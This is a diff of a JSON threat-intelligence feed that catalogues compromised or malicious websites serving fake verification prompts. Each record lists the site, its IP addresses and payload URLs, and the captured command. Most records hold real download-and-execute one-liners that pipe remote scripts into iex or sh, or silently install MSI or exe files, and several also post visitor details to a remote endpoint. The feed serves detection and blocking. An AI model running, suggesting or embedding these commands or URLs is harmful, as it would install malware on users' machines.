@@ -1,5 +1,181 @@
 [
   {
+    "UrlDomain": "sky88.builders",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/wp/ed4b09c0e61090d0"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/wp/ed4b09c0e61090d0')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/wp/ed4b09c0e61090d0"
+    ],
+    "ReportId": "cmwv6el320ed70nmlujb2l3l4",
+    "ScannedAt": "2026-11-24T20:57:34.237000+00:00"
+  },
+  {
+    "UrlDomain": "mukulkumarportfolio222.infinityfreeapp.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "img-codes-cloude.info",
+      "softify.lat",
+      "my.spline.design",
+      "2fmukulkumarportfolio222.infinityfreeapp.com",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display"
+    ],
+    "PayloadUrl": [
+      "https://softify.lat/u/8ecec3ba",
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "185.27.134.102"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=606ee102-fcaa-4a2b-abc7-3daae7290b12&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmukulkumarportfolio222[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A46%3A32.309Z&lastShellAt=2026-11-24T20%3A46%3A32.309Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/u/8ecec3ba"
+    ],
+    "ReportId": "cmwv627v40e0p0nmlrbj89ekr",
+    "ScannedAt": "2026-11-24T20:47:57.336000+00:00"
+  },
+  {
+    "UrlDomain": "alaminsheikh.infinityfreeapp.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "img-codes-cloude.info",
+      "softify.lat",
+      "2falaminsheikh.infinityfreeapp.com",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display"
+    ],
+    "PayloadUrl": [
+      "https://softify.lat/u/8ecec3ba",
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/w/8ecec3ba"
+    ],
+    "IP": [
+      "185.27.134.154"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=4bc397ef-2de8-44e0-a3dd-f3ff488430d4&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falaminsheikh[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A41%3A19.224Z&lastShellAt=2026-11-24T20%3A41%3A19.224Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/u/8ecec3ba"
+    ],
+    "ReportId": "cmwv5viaq0dt60nmlitq669x9",
+    "ScannedAt": "2026-11-24T20:42:44.270000+00:00"
+  },
+  {
+    "UrlDomain": "excelcustomized.com",
+    "DeliveryUrl": [
+      "script.google.com",
+      "img-codes-cloude.info",
+      "softify.lat"
+    ],
+    "PayloadUrl": [
+      "https://softify.lat/u/8ecec3ba",
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec"
+    ],
+    "IP": [
+      "162.241.226.124"
+    ],
+    "Related": [
+      {
+        "Value": "2fexcelcustomized.com",
+        "Type": "Discovered"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=4d3c4f52-9fa0-4410-891c-4ac708cf2a93&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fexcelcustomized[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A37%3A54.250Z&lastShellAt=2026-11-24T20%3A37%3A54.250Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
+      "https://softify.lat/u/8ecec3ba"
+    ],
+    "ReportId": "cmwv5r1yg0do30nmljkhti8qa",
+    "ScannedAt": "2026-11-24T20:39:16.475000+00:00"
+  },
+  {
+    "UrlDomain": "www.khreader.epizy.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info",
+      "script.google.com",
+      "claude-flare-verification.vercel.app",
+      "2fwww.khreader.epizy",
+      "modalelement.classlist.remove",
+      "spinnerelement.style.display"
+    ],
+    "PayloadUrl": [
+      "https://claude-flare-verification.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/win"
+    ],
+    "IP": [
+      "185.27.134.140"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29925874",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=86c4c5bc-11cc-4626-9479-c5ca2a574a74&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]khreader[.]epizy[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-24T20%3A37%3A31.873Z&lastShellAt=2026-11-24T20%3A37%3A31.873Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://claude-flare-verification.vercel.app/lin"
+    ],
+    "ReportId": "cmwv5qmo60dms0nmlx5k8gj36",
+    "ScannedAt": "2026-11-24T20:38:56.659000+00:00"
+  },
+  {
+    "UrlDomain": "staging.uok.ac.rw",
+    "DeliveryUrl": [
+      "snccdn-framework.beer",
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "188.40.167.144"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/783f029f67e20c9d",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/783f029f67e20c9d'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/783f029f67e20c9d"
+    ],
+    "ReportId": "cmwv5lbd80dk00nmlcqi5wclc",
+    "ScannedAt": "2026-11-24T20:34:48.651000+00:00"
+  },
+  {
+    "UrlDomain": "blog.thecursedgroup.rf.gd",
+    "DeliveryUrl": [
+      "undatepu.com"
+    ],
+    "PayloadUrl": [
+      "https://undatepu.com/x"
+    ],
+    "IP": [
+      "185.27.134.252"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"https://undatepu[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "https://undatepu.com/x"
+    ],
+    "ReportId": "cmwv5kxqk0djg0nmlm8i882tp",
+    "ScannedAt": "2026-11-24T20:34:31.079000+00:00"
+  },
+  {
     "UrlDomain": "www.ascent.se",
     "DeliveryUrl": [
       "img-codes-cloude.info",
@@ -13857,37 +14033,5 @@
     ],
     "ReportId": "cmwh0vpmy0mp50omlfe1m6kow",
     "ScannedAt": "2026-11-14T23:14:09.181000+00:00"
-  },
-  {
-    "UrlDomain": "167-148-195-171.sslip.io",
-    "DeliveryUrl": [],
-    "PayloadUrl": [
-      "https://167-148-195-171.sslip.io/r.php?t=nywqcwqayp"
-    ],
-    "IP": [
-      "167.148.195.171"
-    ],
-    "Related": [],
-    "Payload": "POWerShELL -WindowStyle Hidden  -c \\\"irm https:\\/\\/167-148-195-171[.]sslip[.]io\\/r.php?t=nywqcwqayp|iex\\\"",
-    "ResolvedDownloadUrl": [],
-    "ReportId": "cmwgvo49e0m0j0omlaaon818w",
-    "ScannedAt": "2026-11-14T20:48:16.855000+00:00"
-  },
-  {
-    "UrlDomain": "kekman.space",
-    "DeliveryUrl": [],
-    "PayloadUrl": [
-      "https://kekman.space/verify.exe"
-    ],
-    "IP": [
-      "216.198.79.1"
-    ],
-    "Related": [],
-    "Payload": "powershell -w h -c \"iwr https://kekman[.]space/verify.exe -OutFile $env:TEMP\\a.exe;start $env:TEMP\\a.exe\"",
-    "ResolvedDownloadUrl": [
-      "https://kekman.space/verify.exe"
-    ],
-    "ReportId": "cmwgvo0m00m050omlpv3izxoy",
-    "ScannedAt": "2026-11-14T20:48:12.105000+00:00"
   }
 ]
